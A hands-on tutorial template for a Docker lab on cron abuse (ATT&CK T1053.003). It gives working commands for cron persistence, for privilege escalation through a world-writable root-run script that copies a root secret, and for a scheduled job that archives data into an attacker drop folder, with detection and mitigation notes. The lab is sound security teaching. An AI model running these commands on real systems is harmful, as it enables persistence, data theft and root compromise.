# Scheduled Task/Job: Cron — Tutorial

**ATT&CK Technique:** [T1053.003 — Scheduled Task/Job: Cron](https://attack.mitre.org/techniques/T1053/003/)

> **How to read this file:** Text in `[square brackets and italics]` is a
> placeholder for **your own words** — replace it. Blocks marked
> _“Draft — edit in your own voice”_ are a starting draft you can rewrite.
> Everything in the **Setup** and **Tutorial command** blocks is ready to use.
>
> _(Delete this whole quote block before you submit.)_

---

## 1. Introduction & Overview

<!-- WRITE YOUR OWN. Suggested points to cover (2-4 short paragraphs):
     - What cron is in plain English (the built-in Linux "alarm clock" for commands).
     - What the attack is: abusing that scheduler to run attacker commands automatically.
     - One sentence on why this matters / what the reader will do in this tutorial.
     - Define "cron", "crontab", and "persistence" the first time you use them. -->

_[Your introduction here.]_

---

## 2. Why Attackers Use This Technique

<!-- WRITE YOUR OWN. Suggested points:
     - It survives reboots and log-offs (persistence) without the attacker staying connected.
     - It uses a built-in, trusted system tool, so it blends in ("living off the land").
     - It can repeat automatically, undoing a defender's cleanup (tie this to Rocke below). -->

_[Your text here.]_

---

## 3. Prerequisites & Assumptions

<!-- WRITE YOUR OWN for the attacker-side assumptions. Suggested points:
     - The attacker already has some access (a foothold) and can run commands.
     - The target is a Unix-like system that uses cron.
     - (For privilege escalation) a misconfiguration exists, e.g. a root-run script a normal user can edit. -->

_[Your text on what the attack assumes/requires.]_

**To run this lab, you need:**

- **Docker Desktop** installed and running — [install guide](https://docs.docker.com/get-started/get-docker/).
- A terminal (PowerShell on Windows, Terminal on macOS/Linux).
- No Linux experience required — every command is given to you below.

---

## Setup

This lab runs inside a disposable Docker container, so nothing you do can
affect your real computer. Deleting the container erases everything.

**1. Start the lab** (from this `Tutorial/` folder):

```bash
docker compose up -d --build
```

The first build takes a minute or two while Docker downloads the base image.
Later starts are nearly instant.

**2. Open the interactive page** in your browser:

```
http://localhost:8080
```

**3. Open a terminal inside the lab**, as the low-privilege `student` user:

```bash
docker compose exec -u student lab bash
```

You now have a shell inside the container. You can keep the browser page and
this terminal open side by side.

**Check you are the right user** — type `whoami`. It must say `student`. If it
says `root`, you left off `-u student`; type `exit` and run the command above
again. (As root, the privilege-escalation scenario won't make sense, because
root can already read everything.)

> **All tutorial commands run _inside_ this container shell**, not in your
> normal PowerShell/Terminal. If `crontab` or `cat /root/...` gives a "command
> not found" or Windows-looking error, you're outside the container — re-run
> the `docker compose exec` command above.

**4. Watch cron work (optional, in a second terminal).** This streams the
shared log so you can see jobs fire in real time:

```bash
docker compose logs -f lab
```

**Reset at any time** — this throws the container away and rebuilds it fresh.
Run these two commands in PowerShell, one after the other:

```bash
docker compose down
```

```bash
docker compose up -d --build
```

> On **Windows PowerShell** you must run them as two separate commands. Joining
> them with `&&` on one line gives a "not a valid statement separator" error;
> if you want them on one line, use `;` instead of `&&`.

### Troubleshooting (common beginner slip-ups)

None of these can harm your real computer — the lab is sealed in the
container. When in doubt, reset with the command just above.

| Symptom | Cause | Fix |
|---|---|---|
| `docker compose up` fails with a "port is already allocated" error | Something else is using port 8080 | Edit `docker-compose.yml`, change `"8080:8080"` to `"8081:8080"`, and use `http://localhost:8081` |
| A scheduled job never seems to run | Cron only checks once a minute | Wait a full 60 seconds, then check again |
| `crontab: command not found` or a Windows-style error | You're typing in PowerShell, not inside the container | Run `docker compose exec -u student lab bash` first |
| Scenario B lets you read the secret immediately | You're `root`, not `student` | `exit`, then re-run with `-u student` |
| The exfil job created no archives | A `%` in the crontab line wasn't escaped as `\%` | Re-copy the command exactly from Scenario C |
| You broke a script / the lab is a mess | Normal while experimenting | Run `docker compose down`, then `docker compose up -d --build` |
| `&&` gives a "not a valid statement separator" error | Windows PowerShell 5.1 doesn't support `&&` | Run the two commands on separate lines (or use `;` between them) |

---

## Tutorial

You are logged in as `student`, a normal user with no special privileges —
exactly the foothold an attacker might have after a break-in. Each scenario
below shows a different way cron turns that foothold into something worse.

> Cron checks the schedule once a minute, so after you add a job you may need
> to **wait up to 60 seconds** to see it run.

### Scenario 0 — Cron basics (warm-up)

**See your current scheduled jobs** (there are none yet):

```bash
crontab -l
```

*Expected:* `no crontab for student`.

**What's happening:** `crontab` is each user's personal list of scheduled
jobs, and `-l` lists it. An empty list is normal — `student` hasn't scheduled
anything yet.

**Add a harmless job** that writes the time to the shared log every minute:

```bash
(crontab -l 2>/dev/null; echo '* * * * * echo "hello from cron at $(date)" >> /var/log/cron-lab.log') | crontab -
```

**What's happening:** That one-liner reads your existing jobs (`crontab -l`),
tacks on one new line, and pipes the result back in (`| crontab -`) — the safe
way to *add* a job without erasing the others. The job itself is five time
fields (minute, hour, day-of-month, month, day-of-week) followed by the command
to run; `* * * * *` means "every minute."

**Watch it run** (wait up to a minute):

```bash
tail -f /var/log/cron-lab.log
```

*Expected:* a new `hello from cron` line appears every minute. Press
`Ctrl + C` to stop watching.

> _**Draft — edit in your own voice:** Those five stars are the schedule:
> minute, hour, day-of-month, month, day-of-week. Five stars means “every
> minute of every day.” You just told the computer to run a command for you
> on a timer — the exact capability attackers want. Try the “What is a cron
> job?” tool on the page to decode other schedules._

**Clean up before the next scenario:**

```bash
crontab -r
```

---

### Scenario A — Persistence (the Rocke technique)

This mirrors the real-world example in Section “Real-World Example” below:
malware that reinstalls itself whenever you delete it.

**1. Look at the “malware” and its watchdog** (both harmless — they only
write to a log):

```bash
cat /opt/lab/payloads/restore_miner.sh
```

**2. Schedule the watchdog** to run every minute:

```bash
(crontab -l 2>/dev/null; echo '* * * * * /opt/lab/payloads/restore_miner.sh') | crontab -
```

**What's happening:** The watchdog you just scheduled checks once a minute
whether the miner exists, and recreates it if it's gone. In other words, the
**cron job is the real malware** — the miner file is just its disposable
output. This is the trick the Rocke group used.

**3. Wait ~1 minute, then confirm the miner is running:**

```bash
tail -n 5 /var/log/cron-lab.log
```

*Expected:* lines showing the `(miner) earning fake coins...`.

**4. Play defender: delete the miner.**

```bash
rm -f /tmp/miner.sh
```

**5. Wait another minute and look again:**

```bash
tail -n 5 /var/log/cron-lab.log
```

*Expected:* a `(watchdog) miner was missing - restored it!` line — the miner
is **back**.

> _**Draft — edit in your own voice:** You deleted the malware, but it
> returned within a minute. That is persistence. The real fix is to remove the
> **cron job**, not the file it creates. Run `crontab -r` to remove the job,
> then delete `/tmp/miner.sh` one more time — now it stays gone._

**Clean up:**

```bash
crontab -r && rm -f /tmp/miner.sh
```

---

### Scenario B — Privilege Escalation

Here you are still the unprivileged `student`, but you escalate to root by
abusing a script that **root’s** cron job runs.

**1. Confirm you cannot read root’s secret:**

```bash
cat /root/secret.txt
```

*Expected:* `Permission denied`.

**2. Find the weakness** — a root-run script that anyone can edit:

```bash
ls -l /usr/local/bin/system_health.sh
```

*Expected:* permissions `-rwxrwxrwx` (world-writable). Root runs this every
minute.

**3. Hijack it** — append a command that copies root’s secret to your home:

```bash
echo 'cp /root/secret.txt /home/student/loot.txt; chmod 644 /home/student/loot.txt' >> /usr/local/bin/system_health.sh
```

**What's happening:** `system_health.sh` runs as **root** every minute, but
its `rwxrwxrwx` permissions let *any* user edit it. By appending your own line,
you've handed root a command to run on your behalf — copying a root-only file
to a spot you can read. You never needed root's password; you just borrowed
root's scheduled job.

**4. Wait ~1 minute for root’s cron to run the script, then read your loot:**

```bash
cat /home/student/loot.txt
```

*Expected:* the contents of root’s secret file — data you could not read in
step 1.

> _**Draft — edit in your own voice:** You never had root’s password. You
> simply edited a file root had scheduled, and root ran your command for you.
> This is why a world-writable file that a privileged account executes is so
> dangerous._

**Clean up** (restore the script):

```bash
printf '#!/bin/bash\necho "[$(date)] system health: OK" >> /var/log/cron-lab.log\n' > /usr/local/bin/system_health.sh
rm -f /home/student/loot.txt
```

---

### Scenario C — Exfiltration

A cron job can quietly steal data on a repeating schedule.

**1. Look at the “sensitive” company files:**

```bash
ls -l /home/student/company_data
```

**2. Schedule an exfiltration job** that packages the data into the
attacker’s drop folder every minute. (Note the `\%` — inside a crontab the
`%` character must be escaped, a classic beginner gotcha.)

```bash
(crontab -l 2>/dev/null; echo '* * * * * tar -czf /opt/drop/dump-$(date +\%s).tar.gz -C /home/student company_data') | crontab -
```

**What's happening:** Every minute the job bundles the sensitive folder into a
timestamped archive and drops it where the attacker can collect it — automated,
repeating theft with nobody logged in. `$(date +\%s)` gives each archive a
unique name; the `%` is written `\%` because cron treats a bare `%` specially.

**3. Wait ~1–2 minutes, then check the attacker’s drop folder:**

```bash
ls -l /opt/drop
```

*Expected:* one or more `dump-*.tar.gz` archives, piling up over time.

> _**Draft — edit in your own voice:** Each archive is a fresh copy of the
> stolen data. The attacker doesn’t need to stay logged in — cron keeps
> delivering as long as the job exists._

**Clean up:**

```bash
crontab -r && rm -f /opt/drop/*.tar.gz
```

---

### Optional Finale — “Chaos” (do this LAST)

> ⚠️ **Only run this after you have finished everything above.** It
> deliberately trashes the lab to show how destructive and stubborn a
> persistent cron job is. It is sealed inside the container and **cannot touch
> your real computer**, but it will wreck the lab until you reset it.

```bash
/opt/lab/chaos.sh
```

Then **try to clean up** — delete the files, run `crontab -r`, open a new
terminal. Everything keeps coming back, because the job reinstalls itself.

**What's happening:** `chaos.sh` re-adds itself to cron on every run, rewrites
your shell, and wipes the lab's files. Because the job keeps reinstalling
itself, deleting the files — or even the job — doesn't stick. That is exactly
how a persistent attacker outlasts your cleanup.

> _**Draft — edit in your own voice:** This is the whole lesson in one gag. A
> persistent attacker who owns your scheduler can undo your cleanup faster than
> you can do it. The only way out is a full rebuild — the real-world equivalent
> of wiping and reimaging a compromised machine._

**Reset the lab to normal** — run these two commands in PowerShell, one after
the other (Windows PowerShell doesn't accept `&&` to join them):

```bash
docker compose down
```

```bash
docker compose up -d --build
```

---

## Real-World Example

> _The following is from my Attack Pattern Template; see the Talos citation in
> References._

A Talos honeypot recorded that an organization known as **Rocke** exploited
vulnerabilities in Apache Struts. After compromising a system, they attempted
to install cryptocurrency miners. Once installed, persistence was established
by using cron tasks to regularly re-download the miners if they had been
deleted. (Any server running vulnerable Struts, WebLogic, or ColdFusion was at
risk.)

Scenario A above is a safe re-creation of this exact behavior.

---

## ATT&CK / CAPEC Mapping

| | |
|---|---|
| **Technique** | [T1053.003 — Scheduled Task/Job: Cron](https://attack.mitre.org/techniques/T1053/003/) |
| **Parent technique** | [T1053 — Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/) |
| **Primary tactic** | Persistence (TA0003) |
| **Also used for** | Privilege Escalation (TA0004), Execution (TA0002) |

**Related techniques** (from my template):

- **Sibling sub-techniques** of T1053 — At (.002), Scheduled Task (.005),
  Systemd Timer (.006), Container Orchestration Job (.007). Same idea on other
  systems/utilities; `.003` is specifically the Unix `cron` utility.
- [T1037.004 — Boot or Logon Initialization Scripts: RC Scripts](https://attack.mitre.org/techniques/T1037/004/)
- [T1546.004 — Event Triggered Execution: Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004/)

---

## Detection Opportunities

> _From my template (MITRE M1047 Audit / DET0290); see References._

- Review changes to the cron schedule and check cron logs in `/var/log`.
- Alert on new or modified crontab entries — especially by unusual users or
  processes, or jobs that run hidden or renamed scripts.
- Use the **“Spot the malicious entry”** tool on the interactive page to
  practice recognizing the tells: raw IP addresses, downloads piped into a
  shell, hidden paths like `/tmp/.hidden`, and silenced errors.

---

## Mitigations & Defenses

> _From my template; MITRE mitigation IDs noted inline._

- **Preventive:** Limit who can create cron jobs using `/etc/cron.allow` and
  `/etc/cron.deny` (MITRE **M1018**, User Account Management). Apply least
  privilege so cron jobs don’t run as root unnecessarily, and so root’s scripts
  can’t be edited by regular users. *(Scenario B happened only because a
  root-run script was world-writable.)*
- **Detective:** Review changes to the cron schedule and check cron logs in
  `/var/log` (MITRE **M1047**, Audit). Alert on new or modified crontab entries
  (MITRE **DET0290**).
- **Corrective:** Remove the malicious cron entries **and** the files they run,
  then isolate the system and check for other persistence methods. Fix the
  original entry point, and rebuild the system if root access was compromised.

---

## Key Takeaways

<!-- WRITE YOUR OWN. Suggested points (3-5 bullets):
     - Cron is a trusted built-in tool; attackers abuse it to blend in.
     - Persistence means deleting the payload isn't enough - find the job.
     - A privileged, writable, scheduled script = instant privilege escalation.
     - Detection = watch crontabs and cron logs for changes. -->

_[Your key takeaways here.]_

---

## Useful Resources

Places to learn more about cron and scheduled tasks themselves:

- **[crontab.guru](https://crontab.guru/)** — an interactive cron-schedule
  decoder. Type a schedule like `*/5 * * * *` and it tells you in plain English
  when it runs. Great companion to Scenario 0.
- **[Ubuntu CronHowto](https://help.ubuntu.com/community/CronHowto)** — a
  practical community guide to creating and managing cron jobs.
- **[crontab(5) man page](https://man7.org/linux/man-pages/man5/crontab.5.html)**
  — the official reference for the crontab file format and its five time fields.

---

## References

1. **MITRE ATT&CK — T1053.003 (Cron).** Official technique documentation and
   summary. <https://attack.mitre.org/techniques/T1053/003/>
2. **Cisco Talos — “Rocke: The Champion of Monero Miners.”** Real-world report
   of cron-based persistence for crypto-mining malware.
   <https://blog.talosintelligence.com/rocke-champion-of-monero-miners/>
3. **Splunk Research — Scheduled Tasks.** Detection methods and the importance
   of scheduled tasks. <https://research.splunk.com/stories/scheduled_tasks/>
4. **Security Scientist — Cron (T1053.003).** Beginner-friendly explanation of
   the technique. <https://www.securityscientist.net/blog/cron-t1053-003/>
5. **Ontolocy — ATT&CK technique view.** Detection, control validation, and
   mitigation links with an overview.
   <https://explore.ontolocy.com/mitre-attack/techniques/attack-pattern--2acf44aa-542f-4366-b4eb-55ef5747759c/>

<!-- Add any new sources you cite in your own prose above. -->
